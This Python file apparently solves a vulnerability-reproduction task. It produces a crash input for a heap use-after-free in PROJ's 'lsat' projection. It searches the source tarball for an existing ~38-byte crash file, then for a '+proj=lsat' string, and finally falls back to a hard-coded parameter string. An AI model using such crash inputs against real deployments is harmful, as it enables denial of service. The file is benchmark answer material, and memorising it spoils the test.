import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_poc_in_tar(src_path)
        if poc is not None:
            return poc
        poc = self._scan_for_lsat_string(src_path)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _find_poc_in_tar(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
                if not members:
                    return None
                member = self._select_candidate_member(members)
                if member is None:
                    return None
                f = tf.extractfile(member)
                if f is None:
                    return None
                data = f.read()
                if not isinstance(data, bytes):
                    data = bytes(data)
                return data
        except Exception:
            return None

    def _select_candidate_member(self, members):
        KEYWORDS = [
            "poc",
            "proof",
            "crash",
            "uaf",
            "use-after",
            "use_after",
            "heap",
            "heap-use-after",
            "heap_use_after",
            "bug",
            "clusterfuzz",
            "oss-fuzz",
            "ossfuzz",
            "testcase",
            "id_",
            "id-",
            "repro",
            "input",
            "lsat",
            "pj_lsat",
            "landsat",
            "3630",
        ]

        def has_keyword(name_lower: str) -> bool:
            for kw in KEYWORDS:
                if kw in name_lower:
                    return True
            return False

        # Step 1: files of size exactly 38 bytes with relevant keywords
        candidates = [
            m for m in members if m.size == 38 and has_keyword(m.name.lower())
        ]
        candidates.sort(key=lambda m: (m.size, len(m.name)))
        if candidates:
            return candidates[0]

        # Step 2: any file of size exactly 38 bytes
        candidates = [m for m in members if m.size == 38]
        candidates.sort(key=lambda m: (not has_keyword(m.name.lower()), len(m.name)))
        if candidates:
            return candidates[0]

        # Step 3: small files (<=64 bytes) with relevant keywords
        candidates = [
            m for m in members if m.size <= 64 and has_keyword(m.name.lower())
        ]
        candidates.sort(key=lambda m: (m.size, len(m.name)))
        if candidates:
            return candidates[0]

        # Step 4: any file with relevant keywords
        candidates = [m for m in members if has_keyword(m.name.lower())]
        candidates.sort(key=lambda m: (m.size, len(m.name)))
        if candidates:
            return candidates[0]

        # Step 5: smallest small file (<=64 bytes)
        candidates = [m for m in members if m.size <= 64]
        candidates.sort(key=lambda m: (m.size, len(m.name)))
        if candidates:
            return candidates[0]

        # Step 6: absolutely smallest file
        members_sorted = sorted(members, key=lambda m: (m.size, len(m.name)))
        return members_sorted[0] if members_sorted else None

    def _scan_for_lsat_string(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile() or m.size <= 0:
                        continue
                    if m.size > 1024 * 1024:
                        continue

                    lower_name = m.name.lower()
                    is_text_like = any(
                        lower_name.endswith(ext)
                        for ext in (
                            ".c",
                            ".h",
                            ".txt",
                            ".md",
                            ".rst",
                            ".py",
                            ".sh",
                            ".cmake",
                            ".json",
                            ".cfg",
                            ".ini",
                            ".am",
                            ".ac",
                            ".cpp",
                            ".hpp",
                            ".cc",
                        )
                    )
                    if not is_text_like and "lsat" not in lower_name:
                        continue

                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue

                    try:
                        text = data.decode("latin-1", errors="ignore")
                    except Exception:
                        continue

                    if "lsat" not in text.lower():
                        continue

                    # Look for explicit PROJ string pattern on the same line
                    mobj = re.search(
                        r"(\+proj\s*=\s*lsat[^\"\n\r]*)",
                        text,
                        flags=re.IGNORECASE,
                    )
                    if mobj:
                        s = mobj.group(1).strip()
                        s = s.rstrip(");'\"")
                        if s:
                            return s.encode("ascii", errors="ignore")

                    # Look for a quoted string that contains +proj=lsat
                    mobj = re.search(
                        r"\"(\+proj=lsat[^\"]+)\"",
                        text,
                        flags=re.IGNORECASE,
                    )
                    if mobj:
                        s = mobj.group(1).strip()
                        if s:
                            return s.encode("ascii", errors="ignore")
        except Exception:
            return None
        return None

    def _fallback_poc(self) -> bytes:
        s = "+proj=lsat +lsat=0 +path=0 +lat_1=0 +lat_2=0"
        return s.encode("ascii")